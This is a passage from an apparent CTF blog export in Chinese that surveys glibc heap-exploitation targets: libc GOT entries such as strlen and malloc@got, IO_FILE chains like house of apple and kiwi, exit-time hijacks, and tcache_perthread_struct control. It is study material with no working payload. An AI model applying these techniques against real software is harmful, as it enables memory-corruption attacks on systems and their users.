XREF: j_strlen_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED098                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0A0 off_1ED0A0      dq offset __strcasecmp_l_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0A0                                         ; DATA XREF: j___strcasecmp_l_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0A0                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0A8 off_1ED0A8      dq offset strcpy_ifunc  ; DATA XREF: j_strcpy_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0A8                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0B0 off_1ED0B0      dq offset __wcschr_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0B0                                         ; DATA XREF: j___wcschr_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0B0                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0B8 off_1ED0B8      dq offset __strchrnul_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0B8                                         ; DATA XREF: j___strchrnul_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0B8                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0C0 off_1ED0C0      dq offset __memrchr_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0C0                                         ; DATA XREF: j___memrchr_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0C0                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0C8 off_1ED0C8      dq offset _dl_deallocate_tls</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0C8                                         ; DATA XREF: __dl_deallocate_tls↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0D0 off_1ED0D0      dq offset __tls_get_addr</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0D0                                         ; DATA XREF: ___tls_get_addr↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0D8 off_1ED0D8      dq offset __wmemset_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0D8                                         ; DATA XREF: j___wmemset_ifunc_0↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0D8                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0E0 off_1ED0E0      dq offset memcmp_ifunc  ; DATA XREF: j_memcmp_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0E0                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0E8 off_1ED0E8      dq offset __strncasecmp_l_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0E8                                         ; DATA XREF: j___strncasecmp_l_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0E8                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0F0 off_1ED0F0      dq offset _dl_fatal_printf</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0F0                                         ; DATA XREF: __dl_fatal_printf↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0F8 off_1ED0F8      dq offset strcat_ifunc  ; DATA XREF: j_strcat_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED0F8                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED100 off_1ED100      dq offset __wcscpy_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED100                                         ; DATA XREF: j___wcscpy_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED100                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED108 off_1ED108      dq offset strcspn_ifunc ; DATA XREF: j_strcspn_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED108                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED110 off_1ED110      dq offset __strcasecmp_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED110                                         ; DATA XREF: j___strcasecmp_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED110                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED118 off_1ED118      dq offset strncmp_ifunc ; DATA XREF: j_strncmp_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED118                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED120 off_1ED120      dq offset __wmemchr_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED120                                         ; DATA XREF: j___wmemchr_ifunc_0↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED120                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED128 off_1ED128      dq offset __stpncpy_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED128                                         ; DATA XREF: j___stpncpy_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED128                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED130 off_1ED130      dq offset __wcscmp_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED130                                         ; DATA XREF: j___wcscmp_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED130                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED138 off_1ED138      dq offset __libc_memmove_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED138                                         ; DATA XREF: j___libc_memmove_ifunc_0↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED138                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED140 off_1ED140      dq offset strrchr_ifunc ; DATA XREF: j_strrchr_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED140                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED148 off_1ED148      dq offset strchr_ifunc  ; DATA XREF: j_strchr_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED148                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED150 off_1ED150      dq offset __wcschr_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED150                                         ; DATA XREF: j___wcschr_ifunc_0↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED150                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED158 off_1ED158      dq offset __new_memcpy_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED158                                         ; DATA XREF: j___new_memcpy_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED158                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED160 off_1ED160      dq offset _dl_rtld_di_serinfo</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED160                                         ; DATA XREF: __dl_rtld_di_serinfo↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED168 off_1ED168      dq offset _dl_allocate_tls</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED168                                         ; DATA XREF: __dl_allocate_tls↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED170 off_1ED170      dq offset __tunable_get_val</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED170                                         ; DATA XREF: ___tunable_get_val↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED178 off_1ED178      dq offset __wcslen_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED178                                         ; DATA XREF: j___wcslen_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED178                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED180 off_1ED180      dq offset memset_ifunc  ; DATA XREF: j_memset_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED180                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED188 off_1ED188      dq offset __wcsnlen_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED188                                         ; DATA XREF: j___wcsnlen_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED188                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED190 off_1ED190      dq offset strcmp_ifunc  ; DATA XREF: j_strcmp_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED190                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED198 off_1ED198      dq offset _dl_allocate_tls_init</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED198                                         ; DATA XREF: __dl_allocate_tls_init↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED1A0 off_1ED1A0      dq offset __nptl_change_stack_perm</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED1A0                                         ; DATA XREF: ___nptl_change_stack_perm↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED1A8 off_1ED1A8      dq offset strpbrk_ifunc ; DATA XREF: j_strpbrk_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED1A8                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED1B0 off_1ED1B0      dq offset __strnlen_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED1B0                                         ; DATA XREF: j___strnlen_ifunc_0↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED1B0 _got_plt        ends                    ; Indirect relocation</span><br></pre></td></tr></table></figure>\n<p>可以看到got表中包含了很多字符串和内存相关函数，包括strlen等，为什么strlen这种在libc中实现的函数会需要走got表呢？</p>\n<p>笔者在glibc2.34的源代码中进行了查找:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// string/string.h</span></span><br><span class=\"line\"><span class=\"comment\">/* Return the length of S.  */</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"type\">size_t</span> <span class=\"title function_\">strlen</span> <span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *__s)</span></span><br><span class=\"line\">     __THROW __attribute_pure__ __<span class=\"title function_\">nonnull</span> <span class=\"params\">((<span class=\"number\">1</span>))</span>;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// /sysdeps/alpha/strlen.S</span></span><br><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\">ENTRY(<span class=\"built_in\">strlen</span>)</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> PROF</span></span><br><span class=\"line\">\tldgp\tgp, <span class=\"number\">0</span>(pv)</span><br><span class=\"line\">\tlda\tAT, _mcount</span><br><span class=\"line\">\tjsr\tAT, (AT), _mcount</span><br><span class=\"line\">\t.prologue <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">\t.prologue <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\tldq_u   t0, <span class=\"number\">0</span>(a0)\t<span class=\"meta\"># load first quadword (a0 may be misaligned)</span></span><br><span class=\"line\">\tlda     t1, <span class=\"number\">-1</span>(zero)</span><br><span class=\"line\">\tinsqh   t1, a0, t1</span><br><span class=\"line\">\tandnot  a0, <span class=\"number\">7</span>, v0</span><br><span class=\"line\">\tor      t1, t0, t0</span><br><span class=\"line\">\tnop\t\t\t<span class=\"meta\"># dual issue the next two on ev5</span></span><br><span class=\"line\">\tcmpbge  zero, t0, t1\t# t1 &lt;- bitmask: bit i == <span class=\"number\">1</span> &lt;==&gt; i-th byte == <span class=\"number\">0</span></span><br><span class=\"line\">\tbne     t1, $found</span><br><span class=\"line\"></span><br><span class=\"line\">$loop:\tldq     t0, <span class=\"number\">8</span>(v0)</span><br><span class=\"line\">\taddq    v0, <span class=\"number\">8</span>, v0\t<span class=\"meta\"># addr += 8</span></span><br><span class=\"line\">\tcmpbge  zero, t0, t1</span><br><span class=\"line\">\tbeq     t1, $loop</span><br><span class=\"line\"></span><br><span class=\"line\">$found:\tnegq    t1, t2\t\t<span class=\"meta\"># clear all but least set bit</span></span><br><span class=\"line\">\tand     t1, t2, t1</span><br><span class=\"line\"></span><br><span class=\"line\">\tand     t1, <span class=\"number\">0xf0</span>, t2\t<span class=\"meta\"># binary search for that set bit</span></span><br><span class=\"line\">\tand\tt1, <span class=\"number\">0xcc</span>, t3</span><br><span class=\"line\">\tand\tt1, <span class=\"number\">0xaa</span>, t4</span><br><span class=\"line\">\tcmovne\tt2, <span class=\"number\">4</span>, t2</span><br><span class=\"line\">\tcmovne\tt3, <span class=\"number\">2</span>, t3</span><br><span class=\"line\">\tcmovne\tt4, <span class=\"number\">1</span>, t4</span><br><span class=\"line\">\taddq\tt2, t3, t2</span><br><span class=\"line\">\taddq\tv0, t4, v0</span><br><span class=\"line\">\taddq\tv0, t2, v0</span><br><span class=\"line\">\tnop\t\t\t<span class=\"meta\"># dual issue next two on ev4 and ev5</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tsubq    v0, a0, v0</span><br><span class=\"line\">\tret</span><br><span class=\"line\"></span><br><span class=\"line\">\tEND(<span class=\"built_in\">strlen</span>)</span><br><span class=\"line\">libc_hidden_builtin_def (<span class=\"built_in\">strlen</span>)</span><br></pre></td></tr></table></figure>\n<p>发现在strings.h中，strlen是作为extern函数被引入的，然后发现其真正的实现是在其他文件中通过汇编实现的。</p>\n<p>笔者猜测对于glibc对于strlen这种常用操作使用汇编编写来加快执行速度，也因此将其变成了extern 变量。</p>\n<p>由于不是很了解编译过程的实现，笔者暂时还无法对此给出完美的解释，因此先在此按下不表，等待之后的深入研究。</p>\n<p>而在ctf题中，最常劫持的got表也是strlen，因为其会在puts中被调用，很容易被用到。</p>\n<p>同时，在house of pig的攻击流程中，可以将malloc@got作为malloc_hook的替代。</p>\n<p>其优点在于像hooks一样劫持方便，只需要libc地址加一次任意分配即可，缺点在与其利用存在限制，并不是所有程序都会用到got表中的函数</p>\n<h3 id=\"IO-FILE\">IO_FILE</h3>\n<p>在高版本的IO_FILE攻击主要是以下几条利用链(实际上大同小异)，基本上都是通过IO_clean_up来劫持控制流</p>\n<ul>\n<li>house of apple 2/house of cat: <code>_IO_wide_data</code>\n<ul>\n<li>主打一个简单方便</li>\n</ul>\n</li>\n<li>house of kiwi: <code>_IO_file_jumps</code>\n<ul>\n<li>缺点在于_IO_file_jumps在一些版本里是不可写的，而且2.36修改了__malloc_assert</li>\n</ul>\n</li>\n<li>house of emma: <code>_IO_cookie_jumps</code></li>\n</ul>\n<h3 id=\"exit\">exit()</h3>\n<ul>\n<li><strong>rtld_global</strong><br>\n基本上就是house of banana的攻击流程，缺点是ld的加载基址不确定，需要爆破，优点是只需要一次large bin attack即可。</li>\n<li><strong>dtor_list</strong><br>\n通过call_tls_dtors()来劫持控制流，但是需要劫持TCB.pointer_guard</li>\n</ul>\n<h2 id=\"辅助攻击\">辅助攻击</h2>\n<h3 id=\"tcache-perthread-struct\">tcache_perthread_struct</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* There is one of these for each thread, which contains the</span></span><br><span class=\"line\"><span class=\"comment\">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class=\"line\"><span class=\"comment\">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class=\"line\"><span class=\"comment\">   are redundant (we could have just counted the linked list each</span></span><br><span class=\"line\"><span class=\"comment\">   time), this is for performance reasons.  */</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_perthread_struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"type\">uint16_t</span> counts[TCACHE_MAX_BINS]; <span class=\"comment\">// 2*0x40 = 0x80</span></span><br><span class=\"line\">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class=\"comment\">// 8*0x40 = 0x200</span></span><br><span class=\"line\">&#125; tcache_perthread_struct;</span><br><span class=\"line\"><span class=\"comment\">// 0x20+0x10*0x40 = 0x420  </span></span><br></pre></td></tr></table></figure>\n<p>tcache_perthread_struct 是tcache的管理机构，也存在于堆中，如果想办法控制此结构体，即可控制tcache任意分配。<br>\n在glibc2.30以下的版本，counts的类型是char，此结构大小是0x250。</p>\n<p>一般是作为辅助攻击的方法，可以简化攻击链。</p>\n<h4 id=\"example\">example</h4>\n<p>[[2021-DownUnder-note]]</p>\n<h3 id=\"global-max-fast\">global_max_fast</h3>\n<p>实际上就是house of corrison的利用，类似的，tcache也有类似的利用。使得大chunk被当作tcache处理。</p>\n<h3 id=\"heap-info\">heap_info</h3>\n<p>直接攻击堆管理结构体，可以看看这篇帖子:<a href=\"http://phrack.org/issues/66/10.html\">house-of-mind</a><br>\n#TODO</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"clj5d1j740001vwij3qhb1ud4","category_id":"clj5d1j790004vwije2knaorr","_id":"clj5d1j7f000bvwijblveb2xg"},{"post_id":"clj5d1j780003vwij6bxh43ir","category_id":"clj5d1j790004vwije2knaorr","_id":"clj5d1j7f000evwijgfr24afm"}],"PostTag":[{"post_id":"clj5d1j740001vwij3qhb1ud4","tag_id":"clj5d1j7b0005vwij7kcygv97","_id":"clj5d1j7f000dvwij4426gd11"},{"post_id":"clj5d1j740001vwij3qhb1ud4","tag_id":"clj5d1j7d000avwij5q9340vb","_id":"clj5d1j7g000fvwijetqld5ul"},{"post_id":"clj5d1j780003vwij6bxh43ir","tag_id":"clj5d1j7b0005vwij7kcygv97","_id":"clj5d1j7g000hvwij3tufg8l6"},{"post_id":"clj5d1j780003vwij6bxh43ir","tag_id":"clj5d1j7d000avwij5q9340vb","_id":"clj5d1j7g000ivwijd1ud4hxj"}],"Tag":[{"name":"Pwn","_id":"clj5d1j7b0005vwij7kcygv97"},{"name":"CTF","_id":"clj5d1j7d000avwij5q9340vb"}]}}